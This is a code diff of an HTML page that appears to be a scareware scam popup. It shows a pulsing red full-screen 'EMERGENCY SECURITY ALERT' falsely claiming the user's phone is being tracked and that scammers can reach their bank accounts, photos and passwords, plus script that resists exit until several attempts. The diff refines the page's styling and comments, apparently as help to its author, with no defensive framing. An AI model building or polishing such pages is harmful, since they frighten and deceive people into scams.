@@ -14,13 +14,14 @@
         
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-            background: #000;
+            background: #000; /* Already black, good */
             color: white;
             height: 100vh;
             overflow: hidden;
             touch-action: manipulation;
             position: fixed;
             width: 100%;
+            /* These ensure the body takes up the full viewport and doesn't scroll */
         }
         
         .alert-container {
@@ -29,21 +30,23 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0,0,0,0.9);
+            background: rgba(0,0,0,0.9); /* This creates the dark overlay */
             display: flex;
             justify-content: center;
             align-items: center;
             z-index: 1000;
-            padding: 20px;
+            /* The padding here is key to create space around the centered alert-box */
+            padding: 20px; /* This padding applies to the container, pushing the alert-box inwards */
         }
         
         .alert-box {
             background: linear-gradient(135deg, #d10000 0%, #8b0000 100%);
             border: 3px solid #ff0000;
             border-radius: 15px;
-            padding: 25px;
-            width: 100%;
-            max-width: 400px;
+            /* This padding applies to the content *inside* the red box */
+            padding: 25px; /* Keep content from sticking to the edges of the red box */
+            width: 100%; /* Allows it to take up available width within its container */
+            max-width: 400px; /* Crucial: This limits the size of the alert box, making it not full screen */
             text-align: center;
             box-shadow: 0 0 30px rgba(255, 0, 0, 0.7);
             animation: pulse 1.5s infinite;
@@ -122,13 +125,22 @@
             -webkit-user-select: none;
             touch-action: pan-y;
         }
+
+        /* Shake animation (added by your script, but good to have in CSS) */
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20% { transform: translateX(-10px); }
+            40% { transform: translateX(10px); }
+            60% { transform: translateX(-10px); }
+            80% { transform: translateX(10px); }
+        }
     </style>
 </head>
 <body>
     <div class="alert-container" id="alertContainer">
         <div class="alert-box">
             <img src="https://cdn-icons-png.flaticon.com/512/753/753345.png" class="alert-icon" alt="Warning">
-            <h1>  EMERGENCY SECURITY ALERT ⚠️</h1>
+            <h1> EMERGENCY SECURITY ALERT ⚠️</h1>
             <p><strong>YOUR PHONE IS BEING TRACKED!</strong></p>
             <p>Scammers have changed your device location and can access your:</p>
             <p>• Bank accounts<br>• Photos<br>• Passwords</p>
@@ -184,18 +196,8 @@
                 alertBox.offsetHeight; // Trigger reflow
                 alertBox.style.animation = 'shake 0.5s, pulse 1.5s infinite';
                 
-                // Add shake animation
-                const style = document.createElement('style');
-                style.textContent = `
-                    @keyframes shake {
-                        0%, 100% { transform: translateX(0); }
-                        20% { transform: translateX(-10px); }
-                        40% { transform: translateX(10px); }
-                        60% { transform: translateX(-10px); }
-                        80% { transform: translateX(10px); }
-                    }
-                `;
-                document.head.appendChild(style);
+                // The shake animation definition is already in the <style> block,
+                // so no need to create a new style element here.
             } else {
                 // After 7 attempts, allow exit
                 window.location.href = "about:blank";
